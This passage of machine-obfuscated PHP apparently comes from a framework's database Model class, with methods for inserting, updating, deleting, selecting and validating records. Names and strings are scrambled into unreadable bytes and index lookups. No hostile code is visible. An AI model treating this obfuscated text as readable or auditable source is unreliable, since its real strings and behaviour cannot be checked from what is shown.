$É¿î­ìı[$åÍÒéïş[1743]] = 0; $É¿î­ìı[$åÍÒéïş[1740]] = $åÍÒéïş[12]; $É¿î­ìı[$åÍÒéïş[1747]] = 0; $É¿î­ìı[$åÍÒéïş[792]] = $ˆê²ğÜ€[$åÍÒéïş[78]]; $this->update(); self::log($åÍÒéïş[1812] . json_encode(array($É¿î­ìı, $ˆê²ğÜ€))); } public function nameParse($•×Ñø—) { $µ‘ê…´À =& $_SERVER[ ÇƒŠìÀ]; $©Ê¶£… =& $this->task; if ($©Ê¶£…[$µ‘ê…´À[1807]] == $µ‘ê…´À[1229]) { $©Ê¶£…[$µ‘ê…´À[1807]] = $µ‘ê…´À[359]; $©Ê¶£…[$µ‘ê…´À[1747]] = 0; $©Ê¶£…[$µ‘ê…´À[792]] = 0; } $½ô©åæî = get_path_this($•×Ñø—); if (strstr($½ô©åæî, $µ‘ê…´À[10])) { $©Ê¶£…[$µ‘ê…´À[1690]] += 1; $©Ê¶£…[$µ‘ê…´À[815]] += 1; } $©Ê¶£…[$µ‘ê…´À[1740]] = $•×Ñø—; $this->update(); } } goto Cìª¯ã˜¥; fÛ ¨ÂèËô: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\144\x65\162", "\x61\154\x69\x61\x73", "\x68\x61\166\x69\x6e\x67", "\147\x72\157\165\x70", "\154\x6f\143\x6b", "\144\x69\x73\164\x69\x6e\143\x74", "\141\165\x74\x6f", "\x66\151\154\164\x65\x72", "\166\141\x6c\151\x64\141\x74\x65", "\x72\x65\163\x75\x6c\164", "\x62\x69\156\144", "\x74\x6f\153\x65\x6e"); public function __construct($ÓÍ ŒÓ = '', $†Ó–Ç«ş = '', $ÉÕÆĞòó = '') { $ÑÜø½” =& $_SERVER[ ÇƒŠìÀ]; $this->_initialize(); if (!empty($ÓÍ ŒÓ)) { if (strpos($ÓÍ ŒÓ, $ÑÜø½”[10])) { list($this->dbName, $this->name) = explode($ÑÜø½”[10], $ÓÍ ŒÓ); } else { $this->name = $ÓÍ ŒÓ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($†Ó–Ç«ş)) { $this->tablePrefix = $ÑÜø½”[12]; } elseif ($ÑÜø½”[12] != $†Ó–Ç«ş) { $this->tablePrefix = $†Ó–Ç«ş; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÑÜø½”[290]); } $this->db(0, empty($this->connection) ? $ÉÕÆĞòó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $»„ãİ° =& $_SERVER[ ÇƒŠìÀ]; if (empty($this->fields)) { if (think_config($»„ãİ°[291])) { $±²¸ÎËà = $this->dbName ? $this->dbName : think_config($»„ãİ°[292]); $Ó£§Éƒê = think_var_cache($»„ãİ°[293] . strtolower(get_path_this($±²¸ÎËà) . $»„ãİ°[10] . $this->name)); if ($Ó£§Éƒê) { $ÇŒö‹© = think_config($»„ãİ°[294]); if (empty($ÇŒö‹©) || $Ó£§Éƒê[$»„ãİ°[295]] == $ÇŒö‹©) { $this->fields = $Ó£§Éƒê; return; } } } $this->flush(); } } public function flush() { $ˆ©áşÍ‚ =& $_SERVER[ ÇƒŠìÀ]; $this->db->setModel($this->name); $ıã·¿’ = $this->db->getFields($this->getTableName()); if (!$ıã·¿’) { return !1; } $this->fields = array_keys($ıã·¿’); $this->fields[$ˆ©áşÍ‚[296]] = !1; foreach ($ıã·¿’ as $¿â‘ø»– => $ÌíëœìÎ) { $Ÿ¸Û„ì×[$¿â‘ø»–] = $ÌíëœìÎ[$ˆ©áşÍ‚[33]]; if ($ÌíëœìÎ[$ˆ©áşÍ‚[39]]) { $this->fields[$ˆ©áşÍ‚[297]] = $¿â‘ø»–; if ($ÌíëœìÎ[$ˆ©áşÍ‚[42]]) { $this->fields[$ˆ©áşÍ‚[296]] = !0; } } } $this->fields[$ˆ©áşÍ‚[298]] = $Ÿ¸Û„ì×; if (think_config($ˆ©áşÍ‚[294])) { $this->fields[$ˆ©áşÍ‚[295]] = think_config($ˆ©áşÍ‚[294]); } if (think_config($ˆ©áşÍ‚[291])) { $Ú„È€ÒÓ = $this->dbName ? $this->dbName : think_config($ˆ©áşÍ‚[292]); think_var_cache($ˆ©áşÍ‚[293] . strtolower(get_path_this($Ú„È€ÒÓ) . $ˆ©áşÍ‚[10] . $this->name), $this->fields); } } public function switchModel($Ã˜ŒöÌÎ, $à¸ÍóÁå = array()) { $â€ğ÷Ø  =& $_SERVER[ ÇƒŠìÀ]; $óòÉÍÅ½ = ucwords(strtolower($Ã˜ŒöÌÎ)) . $â€ğ÷Ø [299]; if (!class_exists($óòÉÍÅ½)) { think_exception($óòÉÍÅ½ . think_lang($â€ğ÷Ø [300])); } $this->_extModel = new $óòÉÍÅ½($this->name); if (!empty($à¸ÍóÁå)) { foreach ($à¸ÍóÁå as $ïòÎºÍ™) { $this->_extModel->setProperty($ïòÎºÍ™, $this->{$ïòÎºÍ™}); } } return $this->_extModel; } public function __set($Ó¸ñ›¿ş, $ó–Ì¸İÈ) { $this->data[$Ó¸ñ›¿ş] = $ó–Ì¸İÈ; } public function __get($©Ú¬âª¡) { return isset($this->data[$©Ú¬âª¡]) ? $this->data[$©Ú¬âª¡] : null; } public function __isset($À¦äÔãÂ) { return isset($this->data[$À¦äÔãÂ]); } public function __unset($Ş¹’À¨›) { unset($this->data[$Ş¹’À¨›]); } public function __call($ÍßÛ¹‘Õ, $¨Š·ô÷°) { $à¡Ë¹ç² =& $_SERVER[ ÇƒŠìÀ]; if (in_array(strtolower($ÍßÛ¹‘Õ), $this->methods, !0)) { $this->options[strtolower($ÍßÛ¹‘Õ)] = $¨Š·ô÷°[0]; return $this; } elseif (in_array(strtolower($ÍßÛ¹‘Õ), array($à¡Ë¹ç²[301], $à¡Ë¹ç²[302], $à¡Ë¹ç²[303], $à¡Ë¹ç²[304], $à¡Ë¹ç²[305]), !0)) { $™ ØÁ’„ = isset($¨Š·ô÷°[0]) ? $¨Š·ô÷°[0] : $à¡Ë¹ç²[205]; $™ ØÁ’„ = $this->db->parseKey($™ ØÁ’„); return $this->getField(strtoupper($ÍßÛ¹‘Õ) . $à¡Ë¹ç²[306] . $™ ØÁ’„ . $à¡Ë¹ç²[307] . $ÍßÛ¹‘Õ, $à¡Ë¹ç²[301]); } elseif (strtolower(substr($ÍßÛ¹‘Õ, 0, 5)) == $à¡Ë¹ç²[308]) { $™ ØÁ’„ = think_parse_name(substr($ÍßÛ¹‘Õ, 5)); $ìšçÍÙÉ[$™ ØÁ’„] = $¨Š·ô÷°[0]; return $this->where($ìšçÍÙÉ)->find(); } elseif (strtolower(substr($ÍßÛ¹‘Õ, 0, 10)) == $à¡Ë¹ç²[309]) { $¸Ìäšş = think_parse_name(substr($ÍßÛ¹‘Õ, 10)); $ìšçÍÙÉ[$¸Ìäšş] = $¨Š·ô÷°[0]; return $this->where($ìšçÍÙÉ)->getField($¨Š·ô÷°[1]); } elseif (isset($this->_scope[$ÍßÛ¹‘Õ])) { return $this->scope($ÍßÛ¹‘Õ, $¨Š·ô÷°[0]); } elseif (method_exists($this, $ÍßÛ¹‘Õ)) { array_unshift($¨Š·ô÷°, $ÍßÛ¹‘Õ); return call_user_func_array(array($this, $à¡Ë¹ç²[310]), $¨Š·ô÷°); } else { return call_user_func_array(array(parent, $ÍßÛ¹‘Õ), $¨Š·ô÷°); } } protected function call() { $ÆÙ¾¦ì =& $_SERVER[ ÇƒŠìÀ]; $Œ¦ÄÙÇ = func_get_args(); $¤…äß°© = array_shift($Œ¦ÄÙÇ); $¬š÷§ ¦ = $¤…äß°©; if (is_array($¤…äß°©)) { $¬š÷§ ¦ = $¤…äß°©[1]; $¤…äß°© = $¤…äß°©[0]; } $ÀÉ–äôê = count($Œ¦ÄÙÇ) - 1; if (isset($Œ¦ÄÙÇ[$ÀÉ–äôê]) && $Œ¦ÄÙÇ[$ÀÉ–äôê] === $¤…äß°©) { think_exception(__CLASS__ . $ÆÙ¾¦ì[4] . $¤…äß°© . think_lang($ÆÙ¾¦ì[311])); return; } $Œ¦ÄÙÇ[] = $¤…äß°©; if (method_exists($this, $ÆÙ¾¦ì[312])) { $Î²Ì¹ª = call_user_func_array(array($this, $ÆÙ¾¦ì[313]), array($¬š÷§ ¦, $Œ¦ÄÙÇ)); if (!is_null($Î²Ì¹ª) && $Î²Ì¹ª !== !1) { return $Î²Ì¹ª; } } $øˆŒÀœª = call_user_func_array(array($this, $¤…äß°©), $Œ¦ÄÙÇ); if (method_exists($this, $ÆÙ¾¦ì[314])) { $Î²Ì¹ª = call_user_func_array(array($this, $ÆÙ¾¦ì[315]), array($¬š÷§ ¦, $Œ¦ÄÙÇ, $øˆŒÀœª)); if ($Î²Ì¹ª) { return $Î²Ì¹ª; } } return $øˆŒÀœª; } protected function _initialize() { } protected function _facade($Ã‡£€—Ğ) { $˜¥‚ƒÂ¶ =& $_SERVER[ ÇƒŠìÀ]; if (!empty($this->fields)) { foreach ($Ã‡£€—Ğ as $éíş©æ€ => $¥ÂÓó®) { if (is_array($this->fields) && !in_array($éíş©æ€, $this->fields, !0)) { unset($Ã‡£€—Ğ[$éíş©æ€]); } elseif (is_scalar($¥ÂÓó®)) { $this->_parseType($Ã‡£€—Ğ, $éíş©æ€); } } } if (!empty($this->options[$˜¥‚ƒÂ¶[316]])) { $Ã‡£€—Ğ = array_map($this->options[$˜¥‚ƒÂ¶[316]], $Ã‡£€—Ğ); unset($this->options[$˜¥‚ƒÂ¶[316]]); } $this->_beforeWrite($Ã‡£€—Ğ); return $Ã‡£€—Ğ; } protected function _beforeWrite(&$İ£¢ïëÛ) { } public function add($©‰ùô³î = '', $¡–›úÙÓ = array(), $ÃñµˆÈñ = false) { if (empty($©‰ùô³î)) { if (!empty($this->data)) { $©‰ùô³î = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ ÇƒŠìÀ][317]); return !1; } } $¡–›úÙÓ = $this->_parseOptions($¡–›úÙÓ); $©‰ùô³î = $this->_facade($©‰ùô³î); if (!1 === $this->_beforeInsert($©‰ùô³î, $¡–›úÙÓ)) { return !1; } $ÆÒÕ“¾µ = $this->db->insert($©‰ùô³î, $¡–›úÙÓ, $ÃñµˆÈñ); if (!1 !== $ÆÒÕ“¾µ) { $âéŒö = $this->getLastInsID(); if ($âéŒö) { $©‰ùô³î[$this->getPk()] = $âéŒö; $this->_after_insert($©‰ùô³î, $¡–›úÙÓ); return $âéŒö; } $this->_after_insert($©‰ùô³î, $¡–›úÙÓ); } return $ÆÒÕ“¾µ; } protected function _beforeInsert(&$›ˆ¸Ú¹†, $©ä˜’) { } protected function _after_insert($üåí™¶, $ßÍûşï±) { } public function addAll($êŠËÍó•, $ƒ¼ÑÔ÷¬ = array(), $™Ò°ŒÙÔ = false) { $‚äÍ‹§ =& $_SERVER[ ÇƒŠìÀ]; if (empty($êŠËÍó•)) { $this->error = think_lang($‚äÍ‹§[317]); return !1; } $ƒ¼ÑÔ÷¬ = $this->_parseOptions($ƒ¼ÑÔ÷¬); foreach ($êŠËÍó• as $«âñÅÒ => $ŞŸˆˆÂ) { $êŠËÍó•[$«âñÅÒ] = $this->_facade($ŞŸˆˆÂ); } if (method_exists($this->db, $‚äÍ‹§[318])) { $ûáÊ´Á† = $this->db->insertAll($êŠËÍó•, $ƒ¼ÑÔ÷¬, $™Ò°ŒÙÔ); } else { $this->startTrans(); foreach ($êŠËÍó• as $«âñÅÒ => $ŞŸˆˆÂ) { $ûáÊ´Á† = $this->db->insert($ŞŸˆˆÂ, $ƒ¼ÑÔ÷¬, $™Ò°ŒÙÔ); } $this->commit(); } if (!1 !== $ûáÊ´Á†) { $È‰±í˜É = $this->getLastInsID(); if ($È‰±í˜É) { return $È‰±í˜É; } } return $ûáÊ´Á†; } public function selectAdd($Ç¯­ù”¯ = '', $¸–¸®µ¨ = '', $•”ş‹…Ğ = array()) { $ï‰Œê¾ =& $_SERVER[ ÇƒŠìÀ]; $•”ş‹…Ğ = $this->_parseOptions($•”ş‹…Ğ); if (!1 === ($Ò©Ü·óú = $this->db->selectInsert($Ç¯­ù”¯ ? $Ç¯­ù”¯ : $•”ş‹…Ğ[$ï‰Œê¾[319]], $¸–¸®µ¨ ? $¸–¸®µ¨ : $this->getTableName(), $•”ş‹…Ğ))) { $this->error = think_lang($ï‰Œê¾[320]); return !1; } else { return $Ò©Ü·óú; } } public function save($èÌ­ºÒ‘ = '', $ÛÕş«”¯ = array()) { $³Àê­äœ =& $_SERVER[ ÇƒŠìÀ]; if (empty($èÌ­ºÒ‘)) { if (!empty($this->data)) { $èÌ­ºÒ‘ = $this->data; $this->data = array(); } else { $this->error = think_lang($³Àê­äœ[317]); return !1; } } $èÌ­ºÒ‘ = $this->_facade($èÌ­ºÒ‘); $ÛÕş«”¯ = $this->_parseOptions($ÛÕş«”¯); $µ‘ò®Ö› = $this->getPk(); if (!isset($ÛÕş«”¯[$³Àê­äœ[321]])) { if (isset($èÌ­ºÒ‘[$µ‘ò®Ö›])) { $‡Ğ•×æÒ[$µ‘ò®Ö›] = $èÌ­ºÒ‘[$µ‘ò®Ö›]; $ÛÕş«”¯[$³Àê­äœ[321]] = $‡Ğ•×æÒ; unset($èÌ­ºÒ‘[$µ‘ò®Ö›]); } else { $this->error = think_lang($³Àê­äœ[320]); return !1; } } if (is_array($ÛÕş«”¯[$³Àê­äœ[321]]) && isset($ÛÕş«”¯[$³Àê­äœ[321]][$µ‘ò®Ö›])) { $î‰ŞÇÎ³ = $ÛÕş«”¯[$³Àê­äœ[321]][$µ‘ò®Ö›]; } if (!1 === $this->_beforeUpdate($èÌ­ºÒ‘, $ÛÕş«”¯)) { return !1; } $È¨ÕÊÌ = $this->db->update($èÌ­ºÒ‘, $ÛÕş«”¯); if (!1 !== $È¨ÕÊÌ) { if (isset($î‰ŞÇÎ³)) { $èÌ­ºÒ‘[$µ‘ò®Ö›] = $î‰ŞÇÎ³; } $this->_afterUpdate($èÌ­ºÒ‘, $ÛÕş«”¯); } return $È¨ÕÊÌ; } protected function _beforeUpdate(&$´Ã†‹Æ, $À›„£è‹) { } protected function _afterUpdate($±ƒí·å÷, $Ê‰†Ô§) { } public function delete($ºí½ÉÑÇ = array()) { $æãû‚öÆ =& $_SERVER[ ÇƒŠìÀ]; if (empty($ºí½ÉÑÇ) && empty($this->options[$æãû‚öÆ[321]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $æú†åÁæ = $this->getPk(); if (is_numeric($ºí½ÉÑÇ) || is_string($ºí½ÉÑÇ)) { if (strpos($ºí½ÉÑÇ, $æãû‚öÆ[50])) { $ìØ„Ÿ©[$æú†åÁæ] = array($æãû‚öÆ[322], $ºí½ÉÑÇ); } else { $ìØ„Ÿ©[$æú†åÁæ] = $ºí½ÉÑÇ; } $this->options[$æãû‚öÆ[321]] = $ìØ„Ÿ©; } $ºí½ÉÑÇ = $this->_parseOptions(); if (is_array($ºí½ÉÑÇ[$æãû‚öÆ[321]]) && isset($ºí½ÉÑÇ[$æãû‚öÆ[321]][$æú†åÁæ])) { $ış—ÁŸõ = $ºí½ÉÑÇ[$æãû‚öÆ[321]][$æú†åÁæ]; } $€á°×¥ = $this->db->delete($ºí½ÉÑÇ); if (!1 !== $€á°×¥) { $¾Ù½çù = array(); if (isset($ış—ÁŸõ)) { $¾Ù½çù[$æú†åÁæ] = $ış—ÁŸõ; } $this->_after_delete($¾Ù½çù, $ºí½ÉÑÇ); } return $€á°×¥; } protected function _after_delete($³‹îä™È, $·àÀ¶å„) { } public function select($ÈœÔø“ˆ = array()) { $ı•Ù­Îª =& $_SERVER[ ÇƒŠìÀ]; if (is_string($ÈœÔø“ˆ) || is_numeric($ÈœÔø“ˆ)) { $àĞ­©èÎ = $this->getPk(); if (strpos($ÈœÔø“ˆ, $ı•Ù­Îª[50])) { $±úŒ‡íò[$àĞ­©èÎ] = array($ı•Ù­Îª[322], $ÈœÔø“ˆ); } else { $±úŒ‡íò[$àĞ­©èÎ] = $ÈœÔø“ˆ; } $this->options[$ı•Ù­Îª[321]] = $±úŒ‡íò; } elseif (!1 === $ÈœÔø“ˆ) { $ÈœÔø“ˆ = $this->_parseOptions(); return $ı•Ù­Îª[323] . $this->db->buildSelectSql($ÈœÔø“ˆ) . $ı•Ù­Îª[324]; } $ÈœÔø“ˆ = $this->_parseOptions(); $·Ÿì«Œå = $this->db->select($ÈœÔø“ˆ); if (!1 === $·Ÿì«Œå) { return !1; } if (empty($·Ÿì«Œå)) { return null; } $this->_afterSelect($·Ÿì«Œå, $ÈœÔø“ˆ); return $·Ÿì«Œå; } protected function _afterSelect(&$äØŒº‘, $æ²·æıå) { } public function buildSql($âÒ“ªÜş = array()) { $şİäíÈñ =& $_SERVER[ ÇƒŠìÀ]; $âÒ“ªÜş = $this->_parseOptions($âÒ“ªÜş); return $şİäíÈñ[323] . $this->db->buildSelectSql($âÒ“ªÜş) . $şİäíÈñ[324]; } public function optionsValue($ëö“Â¯Ç = null) { if (is_null($ëö“Â¯Ç)) { return $this->options; } elseif (is_array($ëö“Â¯Ç)) { $this->options = array_merge($this->options, $ëö“Â¯Ç); } } protected function _parseOptions($Îæ–Ş¤¬ = array()) { $Œß¾ÌÔÅ =& $_SERVER[ ÇƒŠìÀ]; if (is_array($Îæ–Ş¤¬)) { $Îæ–Ş¤¬ = array_merge($this->options, $Îæ–Ş¤¬); } $this->options = array(); if (!isset($Îæ–Ş¤¬[$Œß¾ÌÔÅ[325]])) { $Îæ–Ş¤¬[$Œß¾ÌÔÅ[325]] = $this->getTableName(); $á¡£’ï¶ = $this->fields; } else { $á¡£’ï¶ = $this->getDbFields(); } if (!empty($Îæ–Ş¤¬[$Œß¾ÌÔÅ[326]])) { $Îæ–Ş¤¬[$Œß¾ÌÔÅ[325]] .= $Œß¾ÌÔÅ[53] . $Îæ–Ş¤¬[$Œß¾ÌÔÅ[326]]; } $Îæ–Ş¤¬[$Œß¾ÌÔÅ[327]] = $this->name; if (isset($Îæ–Ş¤¬[$Œß¾ÌÔÅ[321]]) && is_array($Îæ–Ş¤¬[$Œß¾ÌÔÅ[321]]) && !empty($á¡£’ï¶) && !isset($Îæ–Ş¤¬[$Œß¾ÌÔÅ[328]]) && !isset($Îæ–Ş¤¬[$Œß¾ÌÔÅ[325]])) { foreach ($Îæ–Ş¤¬[$Œß¾ÌÔÅ[321]] as $Ïó éòÂ => $ı¨òì´) { $Ïó éòÂ = trim($Ïó éòÂ); if (in_array($Ïó éòÂ, $á¡£’ï¶, !0)) { if (is_scalar($ı¨òì´)) { $this->_parseType($Îæ–Ş¤¬[$Œß¾ÌÔÅ[321]], $Ïó éòÂ); } } elseif (!is_numeric($Ïó éòÂ) && $Œß¾ÌÔÅ[11] != substr($Ïó éòÂ, 0, 1) && !1 === strpos($Ïó éòÂ, $Œß¾ÌÔÅ[10]) && !1 === strpos($Ïó éòÂ, $Œß¾ÌÔÅ[306]) && !1 === strpos($Ïó éòÂ, $Œß¾ÌÔÅ[329]) && !1 === strpos($Ïó éòÂ, $Œß¾ÌÔÅ[330])) { unset($Îæ–Ş¤¬[$Œß¾ÌÔÅ[321]][$Ïó éòÂ]); } } } $this->_options_filter($Îæ–Ş¤¬); return $Îæ–Ş¤¬; } protected function _options_filter(&$¡„›ß­¤) { } protected function _parseType(&$ªë„Á¢, $ĞßîÃ£Ï) { $·†Îº˜¬ =& $_SERVER[ ÇƒŠìÀ]; if (empty($this->options[$·†Îº˜¬[331]][$·†Îº˜¬[4] . $ĞßîÃ£Ï])) { $—âÆ¹ãõ = strtolower($this->fields[$·†Îº˜¬[298]][$ĞßîÃ£Ï]); if (!1 !== strpos($—âÆ¹ãõ, $·†Îº˜¬[332])) { } elseif (!1 === strpos($—âÆ¹ãõ, $·†Îº˜¬[333]) && !1 !== strpos($—âÆ¹ãõ, $·†Îº˜¬[334])) { $ªë„Á¢[$ĞßîÃ£Ï] = intval($ªë„Á¢[$ĞßîÃ£Ï]); } elseif (!1 !== strpos($—âÆ¹ãõ, $·†Îº˜¬[335]) || !1 !== strpos($—âÆ¹ãõ, $·†Îº˜¬[336])) { $ªë„Á¢[$ĞßîÃ£Ï] = floatval($ªë„Á¢[$ĞßîÃ£Ï]); } elseif (!1 !== strpos($—âÆ¹ãõ, $·†Îº˜¬[337])) { $ªë„Á¢[$ĞßîÃ£Ï] = (bool) $ªë„Á¢[$ĞßîÃ£Ï]; } } } public function find($¶Äœ¿ï = array()) { $‰ï¬Ë•µ =& $_SERVER[ ÇƒŠìÀ]; if (is_numeric($¶Äœ¿ï) || is_string($¶Äœ¿ï)) { $›Õî˜µ[$this->getPk()] = intval($¶Äœ¿ï); $this->options[$‰ï¬Ë•µ[321]] = $›Õî˜µ; } $this->options[$‰ï¬Ë•µ[338]] = 1; $¶Äœ¿ï = $this->_parseOptions(); $ÛˆÕ¾àë = $this->db->select($¶Äœ¿ï); if (!1 === $ÛˆÕ¾àë) { return !1; } if (empty($ÛˆÕ¾àë)) { return null; } $this->data = $ÛˆÕ¾àë[0]; $this->_afterFind($this->data, $¶Äœ¿ï); if (!empty($this->options[$‰ï¬Ë•µ[339]])) { return $this->returnResult($this->data, $this->options[$‰ï¬Ë•µ[339]]); } return $this->data; } protected function _afterFind(&$ûÜ‰¡ôé, $î¾Â³“) { } protected function returnResult($”â¢Õ­, $Ã…™æÆ¨ = '') { $ã—·î“Ç =& $_SERVER[ ÇƒŠìÀ]; if ($Ã…™æÆ¨) { if (is_callable($Ã…™æÆ¨)) { return call_user_func($Ã…™æÆ¨, $”â¢Õ­); } switch (strtolower($Ã…™æÆ¨)) { case $ã—·î“Ç[340]: return json_encode($”â¢Õ­); case $ã—·î“Ç[341]: return xml_encode($”â¢Õ­); } } return $”â¢Õ­; } public function parseFieldsMap($¶è‚§Òğ, $°Ù¯İ± = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Û¨‰¨Ê => $®ü¯ÏÈÛ) { if ($°Ù¯İ± == 1) { if (isset($¶è‚§Òğ[$®ü¯ÏÈÛ])) { $¶è‚§Òğ[$Û¨‰¨Ê] = $¶è‚§Òğ[$®ü¯ÏÈÛ]; unset($¶è‚§Òğ[$®ü¯ÏÈÛ]); } } else { if (isset($¶è‚§Òğ[$Û¨‰¨Ê])) { $¶è‚§Òğ[$®ü¯ÏÈÛ] = $¶è‚§Òğ[$Û¨‰¨Ê]; unset($¶è‚§Òğ[$Û¨‰¨Ê]); } } } } return $¶è‚§Òğ; } public function setField($íöÈÉÆ, $¹£ı§Á = '') { if (is_array($íöÈÉÆ)) { $¹ø¥ÂÙ = $íöÈÉÆ; } else { $¹ø¥ÂÙ[$íöÈÉÆ] = $¹£ı§Á; } return $this->save($¹ø¥ÂÙ); } public function setAdd($§ØÛòŞ±, $í÷Ÿ¼­ç = 1) { $ˆ«¨„„Î =& $_SERVER[ ÇƒŠìÀ]; $ÛµıÆÃÌ = $§ØÛòŞ± . $ˆ«¨„„Î[342] . $í÷Ÿ¼­ç; if ($í÷Ÿ¼­ç < 0) { $ÛµıÆÃÌ = $§ØÛòŞ± . $í÷Ÿ¼­ç; } return $this->setField($§ØÛòŞ±, array($ˆ«¨„„Î[343], $ÛµıÆÃÌ)); } public function getField($Ó¾á‹¶÷, $‰˜µı–¶ = null) { $Õ™¬á¤ =& $_SERVER[ ÇƒŠìÀ]; $ßˆ‰øı”[$Õ™¬á¤[319]] = $Ó¾á‹¶÷; $ßˆ‰øı” = $this->_parseOptions($ßˆ‰øı”); $Ó¾á‹¶÷ = trim($Ó¾á‹¶÷); if (strpos($Ó¾á‹¶÷, $Õ™¬á¤[50])) { if (!isset($ßˆ‰øı”[$Õ™¬á¤[338]])) { $ßˆ‰øı”[$Õ™¬á¤[338]] = is_numeric($‰˜µı–¶) ? $‰˜µı–¶ : $Õ™¬á¤[12]; } $¢ñËè»ƒ = $this->db->select($ßˆ‰øı”); if (!empty($¢ñËè»ƒ)) { $òê»“½ö = explode($Õ™¬á¤[50], $Ó¾á‹¶÷); $Ó¾á‹¶÷ = array_keys($¢ñËè»ƒ[0]); $¡ô§¸º = array_shift($Ó¾á‹¶÷); $šÓ¥ŞŒ = array_shift($Ó¾á‹¶÷); $”İú·÷ç = array(); $Šû¹“ = count($òê»“½ö); foreach ($¢ñËè»ƒ as $‹á…ÓÎ¬) { $ô³æÚÁ = $‹á…ÓÎ¬[$¡ô§¸º]; if (2 == $Šû¹“) { $”İú·÷ç[$ô³æÚÁ] = $‹á…ÓÎ¬[$šÓ¥ŞŒ]; } else { $”İú·÷ç[$ô³æÚÁ] = is_string($‰˜µı–¶) ? implode($‰˜µı–¶, $‹á…ÓÎ¬) : $‹á…ÓÎ¬; } } return $”İú·÷ç; } } else { if (!0 !== $‰˜µı–¶) { $ßˆ‰øı”[$Õ™¬á¤[338]] = is_numeric($‰˜µı–¶) ? $‰˜µı–¶ : 1; } if ($‰˜µı–¶ === $Õ™¬á¤[301]) { unset($ßˆ‰øı”[$Õ™¬á¤[338]]); } $‹á…ÓÎ¬ = $this->db->select($ßˆ‰øı”); if (!empty($‹á…ÓÎ¬)) { if ($‰˜µı–¶ === $Õ™¬á¤[301]) { return reset($‹á…ÓÎ¬[0]); } if (!0 !== $‰˜µı–¶ && 1 == $ßˆ‰øı”[$Õ™¬á¤[338]]) { return reset($‹á…ÓÎ¬[0]); } foreach ($‹á…ÓÎ¬ as $°öÕãÜö) { $à¡Üó©[] = $°öÕãÜö[$Ó¾á‹¶÷]; } return $à¡Üó©; } } return null; } public function create($à€Å»¬ = '', $Ä‚¡‚ëû = '') { $å­›àÍ¡ =& $_SERVER[ ÇƒŠìÀ]; if (empty($à€Å»¬)) { $à€Å»¬ = $_POST; } elseif (is_object($à€Å»¬)) { $à€Å»¬ = get_object_vars($à€Å»¬); } if (empty($à€Å»¬) || !is_array($à€Å»¬)) { $this->error = think_lang($å­›àÍ¡[317]); return !1; } $à€Å»¬ = $this->parseFieldsMap($à€Å»¬, 0); $Ä‚¡‚ëû = $Ä‚¡‚ëû ? $Ä‚¡‚ëû : (!empty($à€Å»¬[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$å­›àÍ¡[319]])) { $ğè±§™¥ = $this->options[$å­›àÍ¡[319]]; unset($this->options[$å­›àÍ¡[319]]); } elseif ($Ä‚¡‚ëû == THINK_MODEL_INSERT && isset($this->insertFields)) { $ğè±§™¥ = $this->insertFields; } elseif ($Ä‚¡‚ëû == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ğè±§™¥ = $this->updateFields; } if (isset($ğè±§™¥)) { if (is_string($ğè±§™¥)) { $ğè±§™¥ = explode($å­›àÍ¡[50], $ğè±§™¥); } if (think_config($å­›àÍ¡[344])) { $ğè±§™¥[] = think_config($å­›àÍ¡[345]); } foreach ($à€Å»¬ as $ÊîİŒÑ¸ => $˜¡²Ÿ²Û) { if (!in_array($ÊîİŒÑ¸, $ğè±§™¥)) { unset($à€Å»¬[$ÊîİŒÑ¸]); } } } if (!$this->autoValidation($à€Å»¬, $Ä‚¡‚ëû)) { return !1; } if (!$this->autoCheckToken($à€Å»¬)) { $this->error = think_lang($å­›àÍ¡[346]); return !1; } if ($this->autoCheckFields) { $ğè±§™¥ = $this->getDbFields(); foreach ($à€Å»¬ as $ÊîİŒÑ¸ => $˜¡²Ÿ²Û) { if (!in_array($ÊîİŒÑ¸, $ğè±§™¥)) { unset($à€Å»¬[$ÊîİŒÑ¸]); } elseif (MAGIC_QUOTES_GPC && is_string($˜¡²Ÿ²Û)) { $à€Å»¬[$ÊîİŒÑ¸] = stripslashes($˜¡²Ÿ²Û); } } } $this->autoOperation($à€Å»¬, $Ä‚¡‚ëû); $this->data = $à€Å»¬; return $à€Å»¬; } public function autoCheckToken($“¦¡Î°¦) { $¹–ïÀŸè =& $_SERVER[ ÇƒŠìÀ]; if (isset($this->options[$¹–ïÀŸè[347]]) && !$this->options[$¹–ïÀŸè[347]]) { return !0; } if (think_config($¹–ïÀŸè[344])) { $»‹ÕïÃÍ = think_config($¹–ïÀŸè[345]); if (!isset($“¦¡Î°¦[$»‹ÕïÃÍ]) || Session::get($»‹ÕïÃÍ)) { return !1; } list($­Ğºóı, $² íãÛØ) = explode($¹–ïÀŸè[11], $“¦¡Î°¦[$»‹ÕïÃÍ]); if ($² íãÛØ && Session::get($»‹ÕïÃÍ . $¹–ïÀŸè[10] . $­Ğºóı) === $² íãÛØ) { Session::remove($»‹ÕïÃÍ . $¹–ïÀŸè[10] . $­Ğºóı); return !0; } if (think_config($¹–ïÀŸè[348])) { Session::remove($»‹ÕïÃÍ . $¹–ïÀŸè[10] . $­Ğºóı); } return !1; } return !0; } public function regex($¤§İ , $™Ôãáò) { $Ù÷˜Õò =& $_SERVER[ ÇƒŠìÀ]; $Âéªƒˆü = array($Ù÷˜Õò[349] => $Ù÷˜Õò[350], $Ù÷˜Õò[351] => $Ù÷˜Õò[352], $Ù÷˜Õò[353] => $Ù÷˜Õò[354], $Ù÷˜Õò[355] => $Ù÷˜Õò[356], $Ù÷˜Õò[357] => $Ù÷˜Õò[358], $Ù÷˜Õò[359] => $Ù÷˜Õò[360], $Ù÷˜Õò[361] => $Ù÷˜Õò[362], $Ù÷˜Õò[336] => 